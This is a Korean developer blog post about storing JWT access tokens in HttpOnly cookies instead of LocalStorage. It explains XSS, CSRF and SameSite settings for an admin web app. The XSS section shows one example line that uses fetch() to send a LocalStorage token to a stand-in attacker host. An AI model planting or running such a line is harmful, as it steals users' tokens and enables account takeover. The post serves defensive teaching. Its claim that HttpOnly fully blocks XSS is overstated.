<h2 id="현재-상황">현재 상황</h2>
<p>현재 많은 웹 애플리케이션은 인증 방식으로 <strong>JWT</strong>(JSON Web Token)를 사용한다. 내가 작업 중인 프로젝트의 인증 플로우는 다음과 같다.</p>
<blockquote>
<ol>
<li>사용자가 로그인을 성공하면, 서버는 <code>AccessToken</code>과 <code>RefreshToken</code>을 발급한다.</li>
<li><code>AccessToken</code>은 보통 1시간 등 짧은 만료 시간을 가지며, API 요청 시마다 인증을 위해 헤더에 첨부된다.</li>
<li><code>AccessToken</code>이 만료되면, 24시간 등 긴 만료 시간을 가진 <code>RefreshToken</code>을 사용하여 새로운 <code>AccessToken</code>을 재발급받는다.</li>
</ol>
</blockquote>
<p>문제는 이 AccessToken을 클라이언트(브라우저) 어디에 저장하느냐이다. 
이번에 리펙토링 중인 유니페스의 백오피스, <code>unifest-admin-web_v2</code>의 경우, 현재 <code>LocalStorage</code>에 토큰을 저장하고 이를 꺼내 쓰고 있다.</p>
<p>이 방식은 구현이 간단하고 당장 동작은 잘 되지만, 심각한 보안 취약점을 내포하고 있다.</p>
<h2 id="localstorage에-accesstoken을-저장하면-안되는-이유">LocalStorage에 AccessToken을 저장하면 안되는 이유</h2>
<p><img alt="" src="https://velog.velcdn.com/images/ysj7191/post/09c844e6-82da-490f-b37f-d6d9294b8b8f/image.png" /></p>
<p><code>LocalStorage</code>에 민감한 정보(AccessToken 등)를 저장하는 것은 보안상 권장되지 않는다. 
주된 이유는 <code>XSS(Cross-Site Scripting)</code> 또는 <code>CSRF</code> 공격에 매우 취약하기 때문이다.</p>
<p><code>LocalStorage</code>는 JavaScript를 통해 <code>localStorage.getItem()</code>, <code>localStorage.setItem()</code> 등으로 쉽게 접근할 수 있다. 이는 편리함을 제공하지만, 반대로 말하면 악의적인 스크립트가 실행될 경우 저장된 모든 정보가 손쉽게 탈취될 수 있음을 의미한다.</p>
<h3 id="xss-공격이란">XSS 공격이란?</h3>
<p><img alt="" src="https://velog.velcdn.com/images/ysj7191/post/89408964-2488-4c1a-a433-373f865b2027/image.png" /></p>
<p><code>XSS(Cross-Site Scripting)</code> 공격은 공격자가 악의적인 스크립트를 웹 사이트에 삽입(Injection)하여, 다른 사용자의 브라우저에서 해당 스크립트가 실행되도록 만드는 공격 기법이다.</p>
<p>만약 <code>LocalStorage</code>에 <code>AccessToken</code>이 저장되어 있다면, 공격자는 다음과 같은 간단한 스크립트 한 줄로 토큰을 탈취할 수 있다.</p>
<pre><code class="language-javascript">// 공격용 스크립트 예시 (게시판 등에 삽입됨)
fetch('[https://attacker-server.com/steal?token=](https://attacker-server.com/steal?token=)' + localStorage.getItem('accessToken'));</code></pre>
<p>사용자가 이 스크립트가 삽입된 게시글을 열람하는 것만으로, 자신의 <code>AccessToken</code>이 공격자의 서버로 전송된다. 공격자는 이 토큰을 이용해 정상적인 사용자인 것처럼 API를 호출하고 민감한 정보를 빼내거나 계정을 장악할 수 있다.</p>
<h3 id="csrf-공격이란">CSRF 공격이란?</h3>
<p><img alt="" src="https://velog.velcdn.com/images/ysj7191/post/9cd08c0c-f1cd-44ce-86a0-2f25b98ef3a3/image.png" /></p>
<p><code>CSRF(Cross-Site Request Forgery) 공격</code>은 사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삭제, 등록 등)를 특정 웹사이트에 요청하게 만드는 공격이다.</p>
<p>이는 사용자가 이미 특정 사이트에 로그인되어 있는 상태(인증 쿠키가 브라우저에 저장된 상태)를 악용한다. 예를 들어, 사용자가 로그인된 상태로 악의적인 링크를 클릭하면, 브라우저는 자동으로 해당 사이트에 인증 쿠키를 포함하여 요청을 보내게 된다.</p>
<p><code>LocalStorage</code>에 토큰을 저장하는 방식은 매 요청 시마다 JavaScript로 헤더에 토큰을 명시적으로 실어 보내야 하므로, 전통적인 <code>CSRF 공격</code>에는 비교적 안전하다. 쿠키처럼 브라우저가 자동으로 요청에 실어주지 않기 때문이다.</p>
<h3 id="그럼-세션은-어떨까">그럼 세션은 어떨까?</h3>
<p>그렇다면 과거에 사용하던 <code>세션(Session) 방식</code>은 안전할까? 만약 세션 ID를 식별하기 위한 쿠키(e.g., JSESSIONID)가 JavaScript로 접근 가능하다면, 
마찬가지로 <code>XSS 공격</code>을 통해 세션 ID가 탈취될 수 있다. 이 경우 <code>LocalStorage</code>와 동일하게 계정 탈취가 가능하다.</p>
<h2 id="대처방법">대처방법</h2>
<p>이러한 보안 위협에 대처하고 <code>AccessToken</code> 및 <code>세션 ID</code>를 안전하게 저장하는 가장 표준적인 방법은 <strong>HttpOnly 속성을 가진 쿠키를 사용하는 것</strong>이다.</p>
<h3 id="httponly-쿠키-사용">HttpOnly 쿠키 사용</h3>
<p><strong><code>HttpOnly</code></strong>는 서버가 클라이언트에 쿠키를 설정할 때(Set-Cookie 헤더) 부여할 수 있는 속성이다.</p>
<pre><code>Set-Cookie: accessToken=...; HttpOnly; Secure; SameSite=Strict</code></pre><p><strong><code>HttpOnly</code></strong> 속성이 설정된 쿠키는 JavaScript의 <code>document.cookie</code> 객체를 통해 <strong>접근할 수 없다</strong>.
오직 브라우저만이 서버와의 통신 시 이 쿠키를 자동으로 헤더에 포함시켜 전송한다.</p>
<p>따라서 XSS 공격으로 인한 악성 스크립트가 실행되더라도 <code>document.cookie</code>로 접근이 불가능하므로, <strong>쿠키에 저장된 AccessToken을 탈취할 수 없다</strong>
XSS 공격을 원천적으로 차단하는 것이다,</p>
<p>또한 개발자가 JavaScript로 매번 <strong>토큰을 헤더에 추가하는 로직을 작성할 필요 없이</strong> 브라우저가 자동으로 관리해준다는 장점이 있다.</p>
<p>그러나 <code>HttpOnly 쿠키</code>를 사용하면 <code>XSS 공격</code>은 막을 수 있지만, 브라우저가 자동으로 쿠키를 전송하기 때문에 <strong><code>CSRF 공격</code>에 취약해진다</strong></p>
<p>따라서 HttpOnly 쿠키를 사용할 때는 반드시 <code>SameSite=Strict</code> 또는 <code>SameSite=Lax</code> 속성을 함께 사용하여 <strong>다른 도메인에서 시작된 요청에는 쿠키가 전송되지 않도록 설정</strong>하고
추가로 <code>CSRF 토큰(Anti-CSRF Token)</code>을 함께 사용하는 것이 가장 안전한 표준이라고 한다.</p>
<h3 id="테스트-결과">테스트 결과</h3>
<p><img alt="" src="https://velog.velcdn.com/images/ysj7191/post/8c4d1554-689a-47e7-b453-872325b5dfcb/image.png" /></p>
<p>간단하게 <code>Normal Cookie</code>와 <code>httpOnlyCookie</code>를 만들어서 비슷한 상황을 시뮬레이션 해보았다</p>
<hr />
<p><img alt="" src="https://velog.velcdn.com/images/ysj7191/post/845fc5cd-dfd5-42ae-b6c0-82c0804ff35d/image.png" />
<code>normalCookie</code>만 보이는 것을 확인할 수 있다.</p>